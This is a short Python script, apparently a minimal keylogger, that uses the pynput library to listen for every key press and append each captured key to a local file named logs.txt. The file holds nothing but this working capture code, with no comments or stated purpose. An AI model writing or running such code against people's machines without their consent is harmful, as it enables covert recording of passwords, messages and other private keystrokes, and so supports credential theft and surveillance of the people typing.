import pynput.keyboard as keyboard

def add(key):
    with open("logs.txt", "a") as f:
        f.write(str(key))

listener = keyboard.Listener(on_press=lambda key: add(key))
listener.start()
listener.join()

